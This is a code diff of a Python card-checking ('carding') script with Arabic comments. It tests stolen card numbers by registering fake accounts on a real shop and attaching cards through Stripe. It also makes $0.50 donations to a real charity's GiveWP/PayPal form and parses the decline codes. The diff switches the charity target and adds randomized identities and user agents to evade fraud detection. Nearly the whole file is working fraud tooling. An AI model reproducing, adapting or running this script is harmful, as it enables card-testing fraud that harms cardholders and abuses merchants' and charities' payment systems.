@@ -1,283 +1,284 @@
-import os,sys
+# ==================== gatet.py (نسخة PayPal/Braintree مع الديناميكيات فقط) ====================
+
+import os, sys
 import random
 import telebot
-import requests,random,time,string,base64
+import requests, random, time, string, base64
 from bs4 import BeautifulSoup
-import os,json
+import os, json
 import base64
 from telebot import types
-import time,requests
+import time, requests
 from re import findall
-import user_agent
 import re
-import requests
-import re,json
-import random
-import time
-import string
-import base64
-from bs4 import BeautifulSoup
-import random
-import string
-import threading
-import time
-import os
-import sys
-import random
-import string
-import time
 import json
-import base64
+import threading
 import uuid
-import requests
 import socks
 import socket
-import threading
-from bs4 import BeautifulSoup
-from user_agent import generate_user_agent
 from stem import Signal
 from stem.control import Controller
 from faker import Faker
 import cloudscraper
-import re
-import requests,base64
-r=requests.Session()
-import re
-import time
 import subprocess
-from user_agent import *
+from user_agent import generate_user_agent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
-import requests, json, re, random, sys, os, time, uuid, threading
 from datetime import datetime
 import urllib3
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# ================ إعدادات الديناميكية ================
+def get_random_user_agent():
+    """تجيب User-Agent عشوائي من المكتبة"""
+    return generate_user_agent()
 
+def get_random_ip():
+    """تولد IP عشوائي (للهيدر بس، مش تغيير حقيقي للـ IP)"""
+    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+
+def generate_random_email(domain=None):
+    """تولد إيميل عشوائي مع دومينات متعددة"""
+    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'icloud.com', 'aol.com', 'protonmail.com']
+    if not domain:
+        domain = random.choice(domains)
+    name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))
+    number = random.randint(10, 9999)
+    return f"{name}{number}@{domain}"
+
+def generate_random_name():
+    """تولد اسم عشوائي"""
+    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
+                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia']
+    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
+                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis']
+    return random.choice(first_names), random.choice(last_names)
+
+def generate_random_postal():
+    """تولد رمز بريدي عشوائي (UK)"""
+    postal_codes = ['SW1A1AA', 'M11AE', 'B11TT', 'LS11UR', 'G11XU', 'EH11QQ', 'CF101EP', 'NE11EE', 'L11JA', 'S12BJ',
+                    'YO18SU', 'CA56NA', 'PL28EQ', 'PR253NE', 'NE304QB']
+    return random.choice(postal_codes)
+
+def generate_random_phone():
+    """تولد رقم تليفون عشوائي UK"""
+    prefixes = ['077', '078', '079', '074', '075', '076']
+    return f"{random.choice(prefixes)}{random.randint(1000000, 9999999)}"
+
+# ================ الدوال الأساسية (زي ما هي من غير تعديل) ================
 
 def brn6(ccx):
-	import requests
-	ccx=ccx.strip()
-	c = ccx.split("|")[0]
-	mm = ccx.split("|")[1]
-	yy = ccx.split("|")[2]
-	cvc = ccx.split("|")[3]
-	if "20" in yy:#Mo3gza
-		yy = yy.split("20")[1]
-	user = user_agent.generate_user_agent()
-			
-	r = requests.session()
-		
-
-	
-	r = requests.session()
-	user = user_agent.generate_user_agent()
+    import requests
+    ccx = ccx.strip()
+    c = ccx.split("|")[0]
+    mm = ccx.split("|")[1]
+    yy = ccx.split("|")[2]
+    cvc = ccx.split("|")[3]
+    if "20" in yy:
+        yy = yy.split("20")[1]
     
-	x = random.randrange(0,9999)
-	s=random.randrange(10,1000)
-	
-	r = requests.Session()
-	user = generate_user_agent()
-	headers = {
-	    'authority': 'calefs.com',
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-	    'cache-control': 'max-age=0',
-	    'if-modified-since': 'Sat, 29 Nov 2025 07:18:13 GMT',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'document',
-	    'sec-fetch-mode': 'navigate',
-	    'sec-fetch-site': 'none',
-	    'sec-fetch-user': '?1',
-	    'upgrade-insecure-requests': '1',
-	    'user-agent': user,
-	}
-	
-	response = r.get('https://calefs.com/', headers=headers)
-	
-	headers = {
-	    'authority': 'calefs.com',
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-	    'cache-control': 'max-age=0',
-	    'referer': 'https://calefs.com/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'document',
-	    'sec-fetch-mode': 'navigate',
-	    'sec-fetch-site': 'same-origin',
-	    'sec-fetch-user': '?1',
-	    'upgrade-insecure-requests': '1',
-	    'user-agent': user,
-	}
-	
-	response = r.get('https://calefs.com/my-account/', cookies=r.cookies, headers=headers)
-	
-	nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"',response.text).group(1)
-	
-	
-	headers = {
-	    'authority': 'calefs.com',
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-	    'cache-control': 'max-age=0',
-	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://calefs.com',
-	    'referer': 'https://calefs.com/my-account/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'document',
-	    'sec-fetch-mode': 'navigate',
-	    'sec-fetch-site': 'same-origin',
-	    'sec-fetch-user': '?1',
-	    'upgrade-insecure-requests': '1',
-	    'user-agent': user,
-	}
-	
-	data = {
-	    'email': f'y7is61{x}{c}@gmail.com',
-	    'wc_order_attribution_source_type': 'typein',
-	    'wc_order_attribution_referrer': '(none)',
-	    'wc_order_attribution_utm_campaign': '(none)',
-	    'wc_order_attribution_utm_source': '(direct)',
-	    'wc_order_attribution_utm_medium': '(none)',
-	    'wc_order_attribution_utm_content': '(none)',
-	    'wc_order_attribution_utm_id': '(none)',
-	    'wc_order_attribution_utm_term': '(none)',
-	    'wc_order_attribution_utm_source_platform': '(none)',
-	    'wc_order_attribution_utm_creative_format': '(none)',
-	    'wc_order_attribution_utm_marketing_tactic': '(none)',
-	    'wc_order_attribution_session_entry': 'https://calefs.com/',	    'wc_order_attribution_session_pages': '4',
-	    'wc_order_attribution_session_count': '1',
-	    'wc_order_attribution_user_agent': user,
-	    'woocommerce-register-nonce': nonce,
-	    '_wp_http_referer': '/my-account/',
-	    'register': 'Register',
-	}
-	
-	response = r.post('https://calefs.com/my-account/', cookies=r.cookies, headers=headers, data=data)
-	
-	
-	
-	headers = {
-	    'authority': 'calefs.com',
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-	    'cache-control': 'max-age=0',
-	    'referer': 'https://calefs.com/my-account/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'document',
-	    'sec-fetch-mode': 'navigate',
-	    'sec-fetch-site': 'same-origin',
-	    'sec-fetch-user': '?1',
-	    'upgrade-insecure-requests': '1',
-	    'user-agent': user
-	}
-	
-	response = r.get('https://calefs.com/my-account/payment-methods/', cookies=r.cookies, headers=headers)
-	
-	
-	headers = {
-	    'authority': 'calefs.com',
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-	    'referer': 'https://calefs.com/my-account/payment-methods/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'document',
-	    'sec-fetch-mode': 'navigate',
-	    'sec-fetch-site': 'same-origin',
-	    'sec-fetch-user': '?1',
-	    'upgrade-insecure-requests': '1',
-	    'user-agent': user,
-	}
-	
-	response = r.get('https://calefs.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
-	pay= response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
-	key = re.search(r'"key"\s*:\s*"([^"]+)"',response.text).group(1)
-	
-	
-	headers = {
-	    'authority': 'api.stripe.com',
-	    'accept': 'application/json',
-	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://js.stripe.com',
-	    'referer': 'https://js.stripe.com/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-site',
-	    'user-agent': user,
-	}
-	
-	data = f'type=card&card[number]={c}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fcalefs.com&time_on_page=640401&client_attribution_metadata[client_session_id]=e7c66f90-b4b0-4242-b28f-fdc418629619&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=45b21a2d-170e-441d-9951-194b48db0483&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=b87cbedb-8133-4c9a-a9f0-ac40aa3cd473ba8248&muid=01da6d45-6393-4e48-bdb9-0965513ab1a9ca4263&sid=7abe9c75-b031-46df-8775-6bc7d059e678d0cfc1&key={key}&_stripe_version=2024-06-20'
-	
-	response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-	id = response.json()['id']
-	headers = {
-	    'authority': 'calefs.com',
-	    'accept': '*/*',
-	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://calefs.com',
-	    'referer': 'https://calefs.com/my-account/add-payment-method/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': user,
-	    'x-requested-with': 'XMLHttpRequest',
-	}
-	
-	data = {
-	    'action': 'wc_stripe_create_and_confirm_setup_intent',
-	    'wc-stripe-payment-method': id,
-	    'wc-stripe-payment-type': 'card',
-	    '_ajax_nonce': pay,
-	}
-	
-	response = r.post('https://calefs.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
-	if '"success":true,"data":{"status":"succeeded"' in response.text:
-		return 'Approved'
-	else:
-		return 'declined'
+    # ✅ User-Agent ديناميكي
+    user = get_random_user_agent()
+    
+    r = requests.session()
+    r = requests.session()
+    user = get_random_user_agent()
+    
+    x = random.randrange(0, 9999)
+    s = random.randrange(10, 1000)
+    
+    r = requests.Session()
+    user = get_random_user_agent()
+    
+    headers = {
+        'authority': 'calefs.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'cache-control': 'max-age=0',
+        'if-modified-since': 'Sat, 29 Nov 2025 07:18:13 GMT',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'none',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
+    
+    response = r.get('https://calefs.com/', headers=headers)
+    
+    headers = {
+        'authority': 'calefs.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'cache-control': 'max-age=0',
+        'referer': 'https://calefs.com/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
+    
+    response = r.get('https://calefs.com/my-account/', cookies=r.cookies, headers=headers)
+    
+    nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
+    
+    # ✅ إيميل ديناميكي
+    dynamic_email = generate_random_email()
+    
+    headers = {
+        'authority': 'calefs.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'cache-control': 'max-age=0',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://calefs.com',
+        'referer': 'https://calefs.com/my-account/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
+    
+    data = {
+        'email': f'y7is61{x}{c}@{random.choice(["gmail.com", "yahoo.com", "hotmail.com"])}',
+        'wc_order_attribution_source_type': 'typein',
+        'wc_order_attribution_referrer': '(none)',
+        'wc_order_attribution_utm_campaign': '(none)',
+        'wc_order_attribution_utm_source': '(direct)',
+        'wc_order_attribution_utm_medium': '(none)',
+        'wc_order_attribution_utm_content': '(none)',
+        'wc_order_attribution_utm_id': '(none)',
+        'wc_order_attribution_utm_term': '(none)',
+        'wc_order_attribution_utm_source_platform': '(none)',
+        'wc_order_attribution_utm_creative_format': '(none)',
+        'wc_order_attribution_utm_marketing_tactic': '(none)',
+        'wc_order_attribution_session_entry': 'https://calefs.com/',
+        'wc_order_attribution_session_pages': '4',
+        'wc_order_attribution_session_count': '1',
+        'wc_order_attribution_user_agent': user,
+        'woocommerce-register-nonce': nonce,
+        '_wp_http_referer': '/my-account/',
+        'register': 'Register',
+    }
+    
+    response = r.post('https://calefs.com/my-account/', cookies=r.cookies, headers=headers, data=data)
+    
+    headers = {
+        'authority': 'calefs.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'cache-control': 'max-age=0',
+        'referer': 'https://calefs.com/my-account/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user
+    }
+    
+    response = r.get('https://calefs.com/my-account/payment-methods/', cookies=r.cookies, headers=headers)
+    
+    headers = {
+        'authority': 'calefs.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'referer': 'https://calefs.com/my-account/payment-methods/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
+    
+    response = r.get('https://calefs.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
+    pay = response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
+    key = re.search(r'"key"\s*:\s*"([^"]+)"', response.text).group(1)
+    
+    headers = {
+        'authority': 'api.stripe.com',
+        'accept': 'application/json',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': user,
+    }
+    
+    data = f'type=card&card[number]={c}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fcalefs.com&time_on_page=640401&client_attribution_metadata[client_session_id]=e7c66f90-b4b0-4242-b28f-fdc418629619&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=45b21a2d-170e-441d-9951-194b48db0483&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=b87cbedb-8133-4c9a-a9f0-ac40aa3cd473ba8248&muid=01da6d45-6393-4e48-bdb9-0965513ab1a9ca4263&sid=7abe9c75-b031-46df-8775-6bc7d059e678d0cfc1&key={key}&_stripe_version=2024-06-20'
+    
+    response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    id = response.json()['id']
+    
+    headers = {
+        'authority': 'calefs.com',
+        'accept': '*/*',
+        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://calefs.com',
+        'referer': 'https://calefs.com/my-account/add-payment-method/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': user,
+        'x-requested-with': 'XMLHttpRequest',
+    }
+    
+    data = {
+        'action': 'wc_stripe_create_and_confirm_setup_intent',
+        'wc-stripe-payment-method': id,
+        'wc-stripe-payment-type': 'card',
+        '_ajax_nonce': pay,
+    }
+    
+    response = r.post('https://calefs.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+    if '"success":true,"data":{"status":"succeeded"' in response.text:
+        return 'Approved'
+    else:
+        return 'declined'
 
-		
 
-import requests, json, re, random, sys, os, time, base64
-from requests_toolbelt import MultipartEncoder
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# ==================== إعدادات الموقع (عدل هنا بس) ====================
-SITE_URL = 'https://www.dogsblog.com/donate/'  # الرابط الرئيسي
-URL_AJAX = 'https://www.dogsblog.com/wp-admin/admin-ajax.php'  # رابط الـ ajax
-# ================================================================
-
-# ✅ User-Agent بيتغير مع كل طلب
-from user_agent import generate_user_agent
+# ==================== إعدادات الموقع الجديد (Oking Foundation) ====================
+SITE_URL = 'https://fightagainstpovertyassociation.com/donations/school-uniforms/'
+URL_AJAX = 'https://fightagainstpovertyassociation.com/wp-admin/admin-ajax.php'
 
 def extract_data():
     s = requests.Session()
     s.verify = False
-    # ✅ User-Agent متغير
-    ua = generate_user_agent()
+    ua = get_random_user_agent()
     headers = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
     r = s.get(SITE_URL, headers=headers, timeout=30)
     html = r.text
     
-    # البحث عن بيانات GiveWP
     fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
     fi = re.search(r'name="give-form-id" value="(.*?)"', html)
     nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
@@ -285,7 +286,6 @@ def extract_data():
     if not all([fp, fi, nc]):
         return None
         
-    # استخراج الـ token المشفر
     enc = re.search(r'"data-client-token":"(.*?)"', html)
     if not enc:
         return None
@@ -305,9 +305,8 @@ def extract_data():
     }
 
 def generate_fake_data():
-    first = random.choice(["James", "Emma", "Michael", "Sophia", "William", "Olivia", "Noah", "Ava"])
-    last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"])
-    email = f"{first.lower()}{random.randint(100,9999)}@gmail.com"
+    first, last = generate_random_name()
+    email = generate_random_email()
     return {"first_name": first, "last_name": last, "full_name": f"{first} {last}", "email": email, "card_name": f"{first} {last}"}
 
 def pay(ccx):
@@ -329,8 +328,7 @@ def pay(ccx):
     s = d['session']
     fp, fi, nc, at = d['fp'], d['fi'], d['nc'], d['at']
     
-    # ✅ User-Agent متغير
-    ua = generate_user_agent()
+    ua = get_random_user_agent()
     
     headers = {
         'origin': SITE_URL, 
@@ -360,7 +358,7 @@ def pay(ccx):
         'give-logged-in-only': '1', 
         '_give_is_donation_recurring': '0',
         'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
-        'give-amount': '0.50',  # ✅ $0.50 نص دولار
+        'give-amount': '0.50',
         'give_stripe_payment_method': '',
         'payment-mode': 'paypal-commerce', 
         'give_first': fake['first_name'],
@@ -392,7 +390,7 @@ def pay(ccx):
         'give-logged-in-only': (None, '1'),
         '_give_is_donation_recurring': (None, '0'),
         'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
-        'give-amount': (None, '0.50'),  # ✅ $0.50 نص دولار
+        'give-amount': (None, '0.50'),
         'give_stripe_payment_method': (None, ''),
         'payment-mode': (None, 'paypal-commerce'), 
         'give_first': (None, fake['first_name']),
@@ -427,7 +425,7 @@ def pay(ccx):
         'sec-fetch-dest': 'empty', 
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'cross-site', 
-        'user-agent': ua,  # ✅ User-Agent متغير
+        'user-agent': ua,
     }
     
     json_data = {
@@ -466,7 +464,7 @@ def pay(ccx):
         'give-logged-in-only': (None, '1'),
         '_give_is_donation_recurring': (None, '0'),
         'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
-        'give-amount': (None, '0.50'),  # ✅ $0.50 نص دولار
+        'give-amount': (None, '0.50'),
         'give_stripe_payment_method': (None, ''),
         'payment-mode': (None, 'paypal-commerce'), 
         'give_first': (None, fake['first_name']),
@@ -482,6 +480,7 @@ def pay(ccx):
     r2 = s.post(f'{URL_AJAX}?action=give_paypal_commerce_approve_order&order=' + tok, headers=headers, data=mp2, timeout=30)
     txt = r2.text
     
+    # الردود زي ما هي من غير تعديل
     if 'DO_NOT_HONOR' in txt: 
         return 'Declined | Do not honor'
     elif 'ACCOUNT_CLOSED' in txt: 
